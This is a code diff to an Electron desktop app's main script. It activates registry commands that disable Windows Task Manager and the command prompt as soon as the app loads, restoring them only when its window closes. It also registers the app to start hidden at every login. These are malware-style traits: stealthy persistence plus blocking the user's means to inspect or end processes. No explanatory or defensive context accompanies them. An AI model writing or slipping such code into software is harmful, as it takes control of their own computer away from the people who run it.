@@ -5,10 +5,10 @@ const { spawn } = require('child_process');
 const { exec } = require('child_process');
 
 // Disable Task Manager
-// exec('REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f');
+exec('REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f');
 
-// // Disable CMD
-// exec('REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f');
+// Disable CMD
+exec('REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f');
 
 function createWindow () {
   // Create the browser window.
@@ -25,15 +25,15 @@ function createWindow () {
 
   // Open the DevTools.
   // mainWindow.webContents.openDevTools()
-  // mainWindow.on('closed', () => {
-  //   // Re-enable Task Manager
-  //   exec('REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 0 /f');
+  mainWindow.on('closed', () => {
+    // Re-enable Task Manager
+    exec('REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 0 /f');
 
-  //   // Re-enable CMD
-  //   exec('REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 0 /f');
+    // Re-enable CMD
+    exec('REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 0 /f');
 
-  //   mainWindow = null;
-  //});
+    mainWindow = null;
+  });
 }
 
 // This method will be called when Electron has finished
@@ -44,7 +44,7 @@ app.whenReady().then(() => {
   // Add your app to the user's startup programs
   app.setLoginItemSettings({
     openAtLogin: true,
-    // openAsHidden: true
+    openAsHidden: true
   });
 
   app.on('activate', function () {
